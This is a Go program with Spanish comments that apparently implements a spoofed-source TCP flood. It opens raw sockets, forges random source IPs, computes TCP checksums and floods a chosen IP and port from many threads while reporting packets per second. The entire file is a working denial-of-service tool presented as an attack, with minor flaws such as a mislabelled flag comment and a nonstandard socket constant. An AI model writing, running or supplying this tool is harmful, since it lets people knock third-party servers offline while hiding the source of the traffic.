package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/ipv4"
)

// Estadísticas globales
var (
	packetsSent int64
	running     int32 = 1
	startTime   = time.Now()
)

// Genera una IP de origen aleatoria (Spoofing)
func randomIP() net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, rand.Uint32())
	return ip
}

// Calcula el Checksum TCP (Obligatorio para que el servidor acepte el paquete)
func checksum(data []byte, srcIP, dstIP net.IP) uint16 {
	// Pseudo-header para el checksum TCP
	pseudoHeader := make([]byte, 12)
	copy(pseudoHeader[0:4], srcIP.To4())
	copy(pseudoHeader[4:8], dstIP.To4())
	pseudoHeader[8] = 0
	pseudoHeader[9] = uint8(syscall.IPPROTO_TCP)
	binary.BigEndian.PutUint16(pseudoHeader[10:12], uint16(len(data)))

	fullData := append(pseudoHeader, data...)
	var sum uint32
	for i := 0; i < len(fullData)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(fullData[i : i+2]))
	}
	if len(fullData)%2 == 1 {
		sum += uint32(fullData[len(fullData)-1]) << 8
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func spoofWorker(destIP string, destPort int, size int, wg *sync.WaitGroup) {
	defer wg.Done()

	// Abrir Raw Socket (requiere ROOT)
	fd, err := syscall.Socket(syscall.AF_INET, syscall.RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatalf("Error creando socket raw: %v (Ejecuta con sudo)", err)
	}
	defer syscall.Close(fd)

	addr := syscall.SockaddrInet4{Port: destPort}
	copy(addr.Addr[:], net.ParseIP(destIP).To4())

	payload := make([]byte, size)
	rand.Read(payload)

	for atomic.LoadInt32(&running) == 1 {
		srcIP := randomIP()
		
		// 1. Encabezado IP
		iph := &ipv4.Header{
			Version:  ipv4.Version,
			Len:      ipv4.HeaderLen,
			TOS:      0,
			TotalLen: ipv4.HeaderLen + 20 + size,
			ID:       rand.Intn(65535),
			FragOff:  0,
			TTL:      64,
			Protocol: syscall.IPPROTO_TCP,
			Src:      srcIP,
			Dst:      net.ParseIP(destIP),
		}
		ipHeader, _ := iph.Marshal()

		// 2. Encabezado TCP (Modo SYN + PSH para saturación)
		tcpHeader := make([]byte, 20)
		binary.BigEndian.PutUint16(tcpHeader[0:2], uint16(rand.Intn(64511)+1024)) // Puerto origen aleatorio
		binary.BigEndian.PutUint16(tcpHeader[2:4], uint16(destPort))              // Puerto destino
		binary.BigEndian.PutUint32(tcpHeader[4:8], rand.Uint32())                  // Secuencia
		binary.BigEndian.PutUint32(tcpHeader[8:12], 0)                             // Ack
		tcpHeader[12] = 0x50                                                       // Offset
		tcpHeader[13] = 0x18                                                       // Flags: PSH + ACK (Efectivo contra RAM)
		binary.BigEndian.PutUint16(tcpHeader[14:16], 64240)                       // Ventana

		// Calcular checksum TCP con la pseudo-cabecera
		check := checksum(append(tcpHeader, payload...), srcIP, net.ParseIP(destIP))
		binary.BigEndian.PutUint16(tcpHeader[16:18], check)

		// 3. Enviar paquete completo
		packet := append(ipHeader, append(tcpHeader, payload...)...)
		err = syscall.Sendto(fd, packet, 0, &addr)
		if err == nil {
			atomic.AddInt64(&packetsSent, 1)
		}
	}
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Uso: sudo go run main.go <IP> <PUERTO> <HILOS> <TAMAÑO>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort, _ := strconv.Atoi(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[3])
	packetSize, _ := strconv.Atoi(os.Args[4])

	runtime.GOMAXPROCS(runtime.NumCPU())
	var wg sync.WaitGroup

	fmt.Printf("🔥 Iniciando RAW SPOOF ATTACK en %s:%d\n", targetIP, targetPort)
	fmt.Printf("🚀 Hilos: %d | Tamaño: %d bytes | IP Spoofing: ACTIVO\n", threads, packetSize)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go spoofWorker(targetIP, targetPort, packetSize, &wg)
	}

	// Monitor de estadísticas cada segundo
	go func() {
		for atomic.LoadInt32(&running) == 1 {
			time.Sleep(1 * time.Second)
			ps := atomic.LoadInt64(&packetsSent)
			duration := time.Since(startTime).Seconds()
			fmt.Printf("\rPaquetes enviados: %d | PPS: %.2f | Ancho de Banda: %.2f Mbps", 
				ps, float64(ps)/duration, (float64(ps*int64(packetSize+40))*8/1000000)/duration)
		}
	}()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	<-stop

	fmt.Println("\nTerminando ataque...")
	atomic.StoreInt32(&running, 0)
	wg.Wait()
}
